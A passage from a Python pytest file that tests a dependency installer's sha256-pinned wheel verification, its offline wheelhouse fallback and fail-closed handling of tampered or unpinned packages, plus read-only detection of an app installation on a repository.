    assert len(calls["pip"]) == 1  # pip attempted (after a verified fetch), then refused


def test_install_dependencies_fails_closed_when_verify_tool_fails():
    driver, _calls = _deps_driver(verify=False)
    result = driver.install_dependencies(["uv"], sudo_tools=[], userspace_tools=["uv"])
    assert result["ok"] is False
    assert result["reason"] == "userspace_tool_verify_failed"


def test_install_dependencies_fails_closed_on_unpinned_userspace_tool():
    driver, _calls = _deps_driver()
    result = driver.install_dependencies(["mystery"], sudo_tools=[], userspace_tools=["mystery"])
    assert result["ok"] is False
    assert result["reason"] == "no_pinned_userspace_wheel"
    assert result["tool"] == "mystery"


def test_install_dependencies_offline_fallback_uses_preseeded_wheelhouse(tmp_path, monkeypatch):
    # CE_FORGE_WHEELHOUSE FALLBACK: a pre-seeded dir holding the pinned wheel is used WITHOUT
    # any mirror fetch (air-gapped / no-egress hosts). The wheel is still sha256-verified.
    seed = tmp_path / "wheelhouse"
    seed.mkdir()
    (seed / _UV_PIN.filename).write_bytes(_UV_BYTES)
    monkeypatch.setenv(onboard_apply_live.ENV_WHEELHOUSE, str(seed))
    driver, calls = _deps_driver()
    result = driver.install_dependencies(["uv"], sudo_tools=[], userspace_tools=["uv"])
    assert result == {"ok": True, "installed": ["uv"]}
    assert calls["fetch"] == []  # the fallback short-circuits the mirror fetch
    assert len(calls["pip"]) == 1


def test_install_dependencies_fallback_with_tampered_wheel_fails_closed(tmp_path, monkeypatch):
    seed = tmp_path / "wheelhouse"
    seed.mkdir()
    (seed / _UV_PIN.filename).write_bytes(b"tampered preseeded wheel")
    monkeypatch.setenv(onboard_apply_live.ENV_WHEELHOUSE, str(seed))
    driver, calls = _deps_driver()
    result = driver.install_dependencies(["uv"], sudo_tools=[], userspace_tools=["uv"])
    assert result["ok"] is False
    assert result["reason"] == "userspace_wheel_sha256_mismatch"
    assert calls["fetch"] == [] and calls["pip"] == []


def test_uv_pin_matches_served_mirror_wheel_and_signed_manifest():
    # the in-code pin must equal the ACTUAL served mirror wheel bytes (reproduced) AND the
    # docs/downloads/0.2.0/SHA256SUMS line AND the docs/llms-install.md required_wheels entry —
    # so the apply-time anti-tamper pin can never silently drift from the signed manifest.
    import hashlib as _h
    served = _MIRROR_DIR / _UV_PIN.filename
    assert served.is_file(), f"uv wheel not served on the mirror: {served}"
    assert _h.sha256(served.read_bytes()).hexdigest() == _UV_PIN.sha256
    repo_root = Path(__file__).resolve().parents[3]
    sums = (_MIRROR_DIR / "SHA256SUMS").read_text(encoding="utf-8")
    assert f"{_UV_PIN.sha256}  {_UV_PIN.filename}" in sums
    llms = (repo_root / "docs" / "llms-install.md").read_text(encoding="utf-8")
    assert _UV_PIN.filename in llms and _UV_PIN.sha256 in llms and _UV_PIN.url in llms


# -- wait_for_app_installation: detect + fail-closed -------------------------
def test_wait_for_app_installation_detects_already_installed_app_read_only():
    forge = _ModeBForge()  # /installation/repositories covers the repo (captured envelope)
    driver = _driver(forge)
    result = driver.wait_for_app_installation(app_plan={"bot_identity": "creator-engine[bot]"}, repo=_REPO)
    driver.close()
    assert result["ok"] is True and result["detected"] is True
    assert result["installation_id"] == 140271364
    assert forge.write_argvs() == []  # pure read, no click, no mutation


def test_wait_for_app_installation_fails_closed_when_repo_not_covered():
    class _NoCover(_ModeBForge):
        def __init__(self):
            super().__init__()
            self.installation_repos = json.dumps({"total_count": 0, "repositories": []})

    forge = _NoCover()
    result = _driver(forge).wait_for_app_installation(app_plan={}, repo=_REPO)
    assert result["ok"] is False
    assert result["reason"] == "app_installation_repo_not_covered"
    assert forge.write_argvs() == []


def test_wait_for_app_installation_fails_closed_when_installation_id_unconfigured():
    cfg = onboard_apply_live.LiveForgeConfig(
        repo=_REPO, installation_id=0, app_client_id="Iv1.testclient",
        signer=lambda b: b"sig", policy_sha="a" * 64, run_id="t",
    )
    result = onboard_apply_live.LiveForgeApplyDriver(cfg).wait_for_app_installation(app_plan={}, repo=_REPO)
    assert result["ok"] is False
    assert result["reason"] == "app_installation_id_unconfigured"
